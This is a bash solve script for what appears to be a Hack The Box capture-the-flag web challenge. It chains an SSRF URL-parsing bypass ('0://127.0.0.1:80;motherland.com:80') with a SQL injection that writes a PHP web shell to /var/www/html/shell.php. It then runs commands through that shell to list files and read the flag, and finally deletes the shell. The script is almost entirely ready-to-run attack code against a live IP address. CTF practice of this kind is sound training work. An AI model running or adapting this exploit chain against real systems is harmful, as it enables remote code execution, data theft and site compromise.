#!/bin/bash
# SSRF:
# This article covers the method used to bypass the url filters here and more
# https://medium.com/@themiddleblue/php-ssrf-techniques-9d422cb28d51

#!/bin/bash

set -e

TARGET='localhost:1337'
TARGET='94.237.53.230:59376'
COOKIES=/tmp/cookies.txt

username=pwn
password=pwn
name=pwn

curl -s "http://$TARGET/register.php" -X POST -d "name=$name&username=$username&password=$password" > /dev/null
curl -s "http://$TARGET/login.php" -X POST -d "username=$username&password=$password" --cookie-jar $COOKIES > /dev/null
echo + user ready, storing sqli

# This url:  0://127.0.0.1:80;motherland.com:80
# get's parsed as a 127.0.0.1:80;motherland.com HOST on php but as 127.0.0.1 on curl. See the article linked at the top of the script
# we will then call localhost and edit the name which would trigger an sqlinjection

# sqlinjection="<?php system(\\\"ls\\\"); ?>' or 1=1 into outfile '/var/www/html/shell.php' -- x"
sqlinjection="<?php system(\$_GET[\\\"cmd\\\"] . \\\" 2>&1\\\"); ?>' OR 1=1 INTO OUTFILE '/var/www/html/shell.php' -- x"
curl -s "http://$TARGET/communicate.php" -F 'url="0://127.0.0.1:80;motherland.com:80"' -F 'data[action]=edit' -F "data[new_name]=\"$sqlinjection\"" --cookie $COOKIES | grep -q 'cURL Error: Operation timed out'

echo + triggering sqli
# this will trigger the sql injection
curl -s "http://$TARGET" --cookie $COOKIES >/dev/null
flagname=$(curl -s "http://$TARGET/shell.php?cmd=ls+/" --cookie $COOKIES | grep flag.txt | awk '{print$2}')
echo + reading $flagname
curl -s "http://$TARGET/shell.php?cmd=cat+/$flagname" --cookie $COOKIES | grep -o 'HTB{[^}]\+}'

# cleanup 
curl -s "http://$TARGET/shell.php?cmd=rm+shell.php" --cookie $COOKIES >/dev/null
